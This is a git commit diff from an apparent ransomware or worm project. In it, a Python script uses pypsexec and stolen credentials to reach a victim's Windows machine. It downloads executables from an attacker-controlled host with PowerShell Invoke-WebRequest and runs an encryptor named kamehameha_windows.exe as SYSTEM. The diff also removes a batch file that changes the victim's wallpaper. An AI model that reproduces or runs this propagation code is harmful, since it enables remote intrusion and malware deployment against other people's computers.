42155ab6aef98ddc4c8b30bc2f3622606b20ca45
YashSahsani <yashsahsani5@gmail.com>
2020-09-16 11:40:30 +0530

    removing redundant code

--- propagation/automated_psexec.py
+++ propagation/automated_psexec.py
@@ -1,5 +1,5 @@
 from pypsexec.client import Client
-
+import time
 
 def psexe(victim_ip,username,password,attacker_ip):
     status=False
@@ -17,10 +17,13 @@ def psexe(victim_ip,username,password,attacker_ip):
         stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/decrypt_kamehameha.exe -o C:\\Users\\"+username+"\\Desktop\\decrypt_kamehameha.exe")
         stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/GOKU.jpg -o C:\\Users\\"+username+"\\Desktop\\GOKU.jpg")
         stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/wall.bat -o C:\\Users\\"+username+"\\Desktop\\wall.bat")
-        stdout, stderr, rc = c.run_executable("C:\\Users\\"+username+"\\Desktop\\wall.bat", use_system_account=True)
-        stdout, stderr, rc = c.run_executable("C:\\Users\\"+username+"\\Desktop\\kamehameha_windows.exe", use_system_account=True)
-        stdout, stderr, rc = c.run_executable("del C:\\Users\\"+username+"\\Desktop\\kamehameha_windows.exe", use_system_account=True)
-        stdout, stderr, rc = c.run_executable("C:\\Users\\"+username+"\\Desktop\\decrypt_kamehameha.exe", use_system_account=True)
+        stdout, stderr, rc = c.run_executable("C:\\Users\\Administrator\\Desktop\\wall.bat", use_system_account=True)
+        stdout, stderr, rc = c.run_executable("C:\\Users\\Administrator\\Desktop\\kamehameha_windows.exe",working_dir="C:\\Users\\Administrator\\Desktop\\",asynchronous=True)
+        time.sleep(3)
+        stdout, stderr, rc = c.run_executable("C:\\Users\\Administrator\\Desktop\\decrypt_kamehameha.exe",working_dir="C:\\Users\\Administrator\\Desktop\\",asynchronous=True)
+        time.sleep(1.5)
+    except Exception as e:
+        print(e)
     finally:
         c.remove_service()
         c.disconnect()
--- wall.bat
+++
@@ -1,6 +0,0 @@
-reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f 
-reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "C:\Users\Sneha\Desktop\GOKU.jpg" /f
-reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
-RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 
-pause
-exit
